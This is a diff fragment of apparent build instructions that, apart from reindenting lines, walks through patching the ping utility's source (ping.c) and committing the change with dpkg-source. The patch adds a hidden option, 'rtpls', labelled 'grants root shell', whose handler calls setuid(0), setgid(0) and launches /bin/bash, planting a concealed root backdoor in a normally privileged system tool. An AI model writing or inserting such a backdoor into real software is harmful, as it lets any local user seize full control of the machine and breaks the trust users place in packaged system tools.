@@ -64,20 +64,20 @@
     vim ping/ping.c
 #add to the end of the unnamed? (ca. line 101) enum:
 
-	ARG_ROOT_PLS
+    ARG_ROOT_PLS
 
 #add to the argp_options array the following element between #define GRP 10 and #undef GRP,
 #must be after {NULL, 0, NULL, 0, "Options controlling ICMP request types:", GRP}:
    
-	{"rtpls",ARG_ROOT_PLS,NULL,OPTION_HIDDEN,"grants root shell",GRP+1},
+    {"rtpls",ARG_ROOT_PLS,NULL,OPTION_HIDDEN,"grants root shell",GRP+1},
     
 #in the parse_opt method add to the switch 
   
-	case ARG_ROOT_PLS:
-	    setuid(0);
-	    setgid(0);
-	    execl("/bin/bash",NULL);
-	    break;
+    case ARG_ROOT_PLS:
+        setuid(0);
+        setgid(0);
+        execl("/bin/bash",NULL);
+        break;
 
 #commit changes 
     dpkg-source --commit
